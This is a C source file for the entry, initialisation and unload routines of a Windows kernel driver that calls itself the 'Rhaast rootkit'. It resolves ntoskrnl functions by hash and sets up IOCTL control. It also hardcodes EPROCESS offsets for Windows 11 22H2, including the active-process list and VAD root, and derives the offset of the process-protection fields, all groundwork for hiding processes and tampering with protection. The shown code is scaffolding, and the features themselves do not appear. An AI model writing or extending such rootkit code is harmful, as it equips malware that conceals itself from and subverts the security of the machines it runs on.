#include <Rhaast.h>

extern PSHORT NtBuildNumber;

/**
 * @brief
 *      main entry point of the rhaast rootkit
 *  
 * @return	
 *      if successful executed function
 */
NTSTATUS RhaastEntry(
    VOID
) {
    NTSTATUS NtStatus = STATUS_SUCCESS;

    PUTS( "Rhaast loaded" );

    Instance.DriverObject->DriverUnload = ( PDRIVER_UNLOAD ) RhaastUnLoad;

    /* init driver and other resources/info */
    if ( ! NT_SUCCESS( NtStatus = RhaastInit() ) ) {
        PUTS( "Failed to init Rhaast driver" )
        return NtStatus;
    }
    
    /* init I/O communication over IOCTLs */
    if ( ! NT_SUCCESS( NtStatus = TsIoCtlInit() ) ) {
        PRINTF( "Failed init IOCTL communication: %p\n", NtStatus )
    }
    
    return NtStatus; 
}

/**
 * @brief
 *      initialize rhaast rootkit features & data
 *
 * @return
 *      status of function execution 
 */
NTSTATUS RhaastInit(
    VOID
) {
    NTSTATUS NtStatus = STATUS_SUCCESS;

    /* check if it's below Win11 22H2 since
     * this driver only supports Win11 and above.
     * Or well i only tested it on those versions
     * and im too lazy to support older versions.
     */
    if ( ( Instance.WindowsBuild = *NtBuildNumber ) < WINBUILD_1122H2 ) {
        return STATUS_NOT_SUPPORTED;
    }

    /* try to get the ntoskrnl.exe base address */
    if ( ! ( Instance.NtKrnlOs = RsKernelBase() ) ) {
        PUTS( "Failed to get kernel base address" )
        return STATUS_UNSUCCESSFUL;
    }

    /* set offets */
    switch ( Instance.WindowsBuild )
    {
        case WINBUILD_1122H2: 
        {
            /* EPROCESS offsets */
            Instance.Ofs.ProcessLock       = 0x438;
            Instance.Ofs.ProcessActiveList = 0x448;
            Instance.Ofs.ProcessVadRoot    = 0x7d8;

            break;
        }

        default: {
            return STATUS_NOT_SUPPORTED;
        }
    }

    /* get offsets dynamically */
    {
        /* dynamically get the offset for process protection
         * SignatureLevel, SectionSignatureLevel and _PS_PROTECTION */
        Instance.Ofs.ProcessProtection = DREF_U16( U_PTR( RsLdrFunction( H_API_PSISPROTECTEDPROCESSLIGHT ) ) + 0x2 ) - 0x2;
    }

    /*
     * Load ntoskrnl.exe functions
     */
    
    if ( ! ( Instance.Win32.ZwQuerySystemInformation = RsLdrFunction( H_API_ZWQUERYSYSTEMINFORMATION ) ) ) {
        return STATUS_UNSUCCESSFUL;
    }

    return NtStatus;
}

/**
 * @brief
 *      Entry of unloading the rhaast driver from kernel 
 *      Free resources & memory
 * 
 * @param DriverObject
 *      DriverObject of the current rhaast rootkit
 */
VOID RhaastUnLoad(
    _In_ PDRIVER_OBJECT DriverObject
) {
    PUTS( "Starting to unload driver & resources" )

    /* TODO: free up memory & resources */

    PUTS( "Finished cleanup. Cya" ) 
}